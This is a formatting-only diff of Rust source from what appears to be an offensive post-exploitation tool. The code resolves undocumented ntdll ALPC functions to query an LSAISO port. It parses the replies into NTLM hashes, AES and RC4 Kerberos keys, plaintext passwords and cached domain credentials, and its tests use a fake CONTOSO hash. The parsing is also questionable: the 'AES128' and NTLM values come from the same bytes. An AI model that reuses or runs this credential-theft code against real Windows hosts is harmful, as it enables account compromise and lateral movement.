@@ -156,10 +156,9 @@ mod alpc {
         /// Connect to an ALPC port by name
         pub fn connect(port_name: &str) -> Result<Self> {
             unsafe {
-                let ntdll = GetModuleHandleA(windows::core::s!("ntdll.dll"))
-                    .map_err(|e| OverthroneError::PostExploitation(format!(
-                        "Failed to get ntdll handle: {e}"
-                    )))?;
+                let ntdll = GetModuleHandleA(windows::core::s!("ntdll.dll")).map_err(|e| {
+                    OverthroneError::PostExploitation(format!("Failed to get ntdll handle: {e}"))
+                })?;
 
                 let nt_alpc_connect_port: extern "system" fn(
                     *mut HANDLE,
@@ -173,14 +172,18 @@ mod alpc {
                     *mut std::ffi::c_void,
                     *mut std::ffi::c_void,
                 ) -> i32 = mem::transmute(
-                    GetProcAddress(ntdll, windows::core::s!("NtAlpcConnectPort"))
-                        .ok_or_else(|| OverthroneError::PostExploitation(
-                            "NtAlpcConnectPort not found in ntdll.dll".to_string()
-                        ))?
+                    GetProcAddress(ntdll, windows::core::s!("NtAlpcConnectPort")).ok_or_else(
+                        || {
+                            OverthroneError::PostExploitation(
+                                "NtAlpcConnectPort not found in ntdll.dll".to_string(),
+                            )
+                        },
+                    )?,
                 );
 
                 let mut port_handle: HANDLE = HANDLE(std::ptr::null_mut());
-                let port_name_wide: Vec<u16> = port_name.encode_utf16().chain(std::iter::once(0)).collect();
+                let port_name_wide: Vec<u16> =
+                    port_name.encode_utf16().chain(std::iter::once(0)).collect();
 
                 let status = nt_alpc_connect_port(
                     &mut port_handle as *mut _,
@@ -220,15 +223,18 @@ mod alpc {
                     *mut u32,
                     *mut std::ffi::c_void,
                 ) -> i32 = {
-                    let ntdll = GetModuleHandleA(windows::core::s!("ntdll.dll"))
-                        .map_err(|e| OverthroneError::PostExploitation(format!(
+                    let ntdll = GetModuleHandleA(windows::core::s!("ntdll.dll")).map_err(|e| {
+                        OverthroneError::PostExploitation(format!(
                             "Failed to get ntdll handle: {e}"
-                        )))?;
+                        ))
+                    })?;
                     mem::transmute(
                         GetProcAddress(ntdll, windows::core::s!("NtAlpcSendWaitReceivePort"))
-                            .ok_or_else(|| OverthroneError::PostExploitation(
-                                "NtAlpcSendWaitReceivePort not found".to_string()
-                            ))?
+                            .ok_or_else(|| {
+                                OverthroneError::PostExploitation(
+                                    "NtAlpcSendWaitReceivePort not found".to_string(),
+                                )
+                            })?,
                     )
                 };
 
@@ -260,7 +266,8 @@ mod alpc {
             if self.connected {
                 unsafe {
                     if let Some(module) = GetModuleHandleA(windows::core::s!("ntdll.dll")).ok()
-                        && let Some(proc) = GetProcAddress(module, windows::core::s!("NtAlpcDisconnectPort"))
+                        && let Some(proc) =
+                            GetProcAddress(module, windows::core::s!("NtAlpcDisconnectPort"))
                     {
                         let disconnect_fn: extern "system" fn(HANDLE) -> i32 = mem::transmute(proc);
                         disconnect_fn(self.handle);
@@ -355,45 +362,44 @@ fn parse_credential_entry(data: &[u8]) -> Result<LsaIsoCredential> {
         String::new()
     };
 
-    let (ntlm_hash, aes256_key, aes128_key, rc4_key, plaintext, cred_type) = if hash_len > 0
-        && offset + hash_len <= data.len()
-    {
-        let hash_data = &data[offset..offset + hash_len];
-        let mut ntlm = None;
-        let mut aes256 = None;
-        let mut aes128 = None;
-        let mut rc4 = None;
-        let mut plain = None;
+    let (ntlm_hash, aes256_key, aes128_key, rc4_key, plaintext, cred_type) =
+        if hash_len > 0 && offset + hash_len <= data.len() {
+            let hash_data = &data[offset..offset + hash_len];
+            let mut ntlm = None;
+            let mut aes256 = None;
+            let mut aes128 = None;
+            let mut rc4 = None;
+            let mut plain = None;
 
-        if hash_data.len() >= 16 {
-            ntlm = Some(hex::encode(&hash_data[..16]));
-        }
-        if hash_data.len() >= 32 {
-            aes256 = Some(hex::encode(&hash_data[..32]));
-            aes128 = Some(hex::encode(&hash_data[..16]));
-        }
-        if hash_data.len() >= 48 {
-            rc4 = Some(hex::encode(&hash_data[32..48]));
-        }
-        if hash_data.len() > 64 {
-            let extra = &hash_data[64..];
-            plain = String::from_utf8(extra.to_vec()).ok();
-        }
+            if hash_data.len() >= 16 {
+                ntlm = Some(hex::encode(&hash_data[..16]));
+            }
+            if hash_data.len() >= 32 {
+                aes256 = Some(hex::encode(&hash_data[..32]));
+                aes128 = Some(hex::encode(&hash_data[..16]));
+            }
+            if hash_data.len() >= 48 {
+                rc4 = Some(hex::encode(&hash_data[32..48]));
+            }
+            if hash_data.len() > 64 {
+                let extra = &hash_data[64..];
+                plain = String::from_utf8(extra.to_vec()).ok();
+            }
 
-        let ctype = if flags & 0x01 != 0 {
-            LsaIsoCredType::DomainCached
-        } else if flags & 0x02 != 0 {
-            LsaIsoCredType::KerberosCache
-        } else if flags & 0x04 != 0 {
-            LsaIsoCredType::Supplemental
+            let ctype = if flags & 0x01 != 0 {
+                LsaIsoCredType::DomainCached
+            } else if flags & 0x02 != 0 {
+                LsaIsoCredType::KerberosCache
+            } else if flags & 0x04 != 0 {
+                LsaIsoCredType::Supplemental
+            } else {
+                LsaIsoCredType::LogonSession
+            };
+
+            (ntlm, aes256, aes128, rc4, plain, ctype)
         } else {
-            LsaIsoCredType::LogonSession
+            (None, None, None, None, None, LsaIsoCredType::LogonSession)
         };
-
-        (ntlm, aes256, aes128, rc4, plain, ctype)
-    } else {
-        (None, None, None, None, None, LsaIsoCredType::LogonSession)
-    };
 
     Ok(LsaIsoCredential {
         identity,
@@ -416,16 +422,12 @@ fn parse_lsaiso_response(response: &[u8]) -> Result<Vec<LsaIsoCredential>> {
         ));
     }
 
-    let status = u32::from_le_bytes(
-        response[4..8].try_into().map_err(|_| OverthroneError::PostExploitation(
-            "Failed to read LSAISO response status".to_string()
-        ))?
-    );
-    let entry_count = u32::from_le_bytes(
-        response[8..12].try_into().map_err(|_| OverthroneError::PostExploitation(
-            "Failed to read LSAISO response entry_count".to_string()
-        ))?
-    );
+    let status = u32::from_le_bytes(response[4..8].try_into().map_err(|_| {
+        OverthroneError::PostExploitation("Failed to read LSAISO response status".to_string())
+    })?);
+    let entry_count = u32::from_le_bytes(response[8..12].try_into().map_err(|_| {
+        OverthroneError::PostExploitation("Failed to read LSAISO response entry_count".to_string())
+    })?);
 
     if status != 0 {
         return Err(OverthroneError::PostExploitation(format!(
@@ -599,17 +601,14 @@ mod tests {
         data.extend_from_slice(b"CONTOSO\\");
         // hash bytes (16 bytes of NTLM hash)
         data.extend_from_slice(&[
-            0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00, 0x11,
-            0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99,
+            0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
+            0x88, 0x99,
         ]);
 
         let entry = parse_credential_entry(&data).unwrap();
         assert_eq!(entry.identity, "CONTOSO\\");
         assert_eq!(entry.cred_type, LsaIsoCredType::DomainCached);
-        assert_eq!(
-            entry.ntlm_hash.unwrap(),
-            "aabbccddeeff00112233445566778899"
-        );
+        assert_eq!(entry.ntlm_hash.unwrap(), "aabbccddeeff00112233445566778899");
     }
 
     #[test]
@@ -667,8 +666,14 @@ mod tests {
 
     #[test]
     fn test_op_code_display() {
-        assert_eq!(LsaIsoOpCode::QueryAllSessions.to_string(), "QueryAllSessions");
-        assert_eq!(LsaIsoOpCode::QueryDomainCredentials.to_string(), "QueryDomainCredentials");
+        assert_eq!(
+            LsaIsoOpCode::QueryAllSessions.to_string(),
+            "QueryAllSessions"
+        );
+        assert_eq!(
+            LsaIsoOpCode::QueryDomainCredentials.to_string(),
+            "QueryDomainCredentials"
+        );
     }
 
     #[test]
